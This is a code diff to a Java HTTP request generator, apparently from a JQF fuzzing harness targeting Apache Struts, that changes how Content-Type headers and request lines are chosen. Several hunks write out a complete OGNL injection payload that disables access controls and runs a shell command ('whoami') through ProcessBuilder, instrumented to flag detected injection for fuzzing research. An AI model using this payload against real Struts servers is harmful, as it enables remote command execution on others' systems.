@@ -152,9 +152,11 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
         ret.add(createHeaderString("Host", (injectOGNLInHeaders && false) ? this.OGNLInjectionStrings.generate(random, status) :"any"));
 
 
-        String contentType  ="${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
 
-        contentType = applyTaints(contentType, 1);
+        ArrayList<String> contentTypeVals = getDictionaryValues("dictionaries/http-content-types.dict");
+
+
+        String contentType = chooseAndTaint(contentTypeVals, random);
 
         ret.add(createHeaderString("Content-Type", contentType));
 
@@ -239,22 +241,38 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 
         String[] hints = StringEqualsHintingInputStream.getHintsForCurrentInput();
 
-        String word;
+        String word ="";
 
         int choice = random.nextInt(65535);
-        if (hints != null && hints.length > 0 ) {
-            choice = choice % hints.length;
-            word = hints[choice];
-        } else {
-            word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
 
+        boolean coin = random.nextBoolean();
+        if(coin) {
+            if (hints != null && hints.length > 0) {
+                choice = choice % hints.length;
+                word = hints[choice];
+            }
+        }
+        else {
+                choice = random.nextInt(3);
+                switch (choice) {
+
+                    case 0:
+                        word = "${(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection@setInjectionDetected(true)).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
+                        break;
+                    case 1:
+                        word = "text/html";
+                        break;
+                    case 2:
+                        word = "testing";
+                        break;
+                }
         }
 
-        request = "POST /" + "struts2-showcase-2_3_10" + "/integration/saveGangster.action HTTP/1.1\r\n" +
+        request = getReqTypeString(random) + "\r\n" +
                 "Host: any\r\n" +
-                "Content-Type:" + applyTaints(word, 1) + "\r\n" +
+                "Content-Type:" + applyTaints(word, choice) + "\r\n" +
                 "Content-Length: 0\r\n\r\n" + "\r\n\r\n";
-        return applyTaints(request,2);
+        return request;
     }
 
     protected String getBody(SourceOfRandomness random, GenerationStatus status, String url) {
@@ -357,7 +375,7 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
 
         String url = chooseAndTaint(urlVals, random);
 
-        int index = 1; //random.nextInt(1);
+        int index = random.nextInt(2);
         String result = "";
         switch(index) {
             case 0:
@@ -376,8 +394,10 @@ public class StrutsRequestGenerator extends HTTPRequestGenerator {
                 result = "TRACE"; //return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
                 break;
         }
-        result += (" " + url + " HTTP/1.1");
+
         result = applyTaints(result, index);
+        result += (" " + url + " HTTP/1.1");
+//        result = applyTaints(result, index);
         return result;
     }
 }
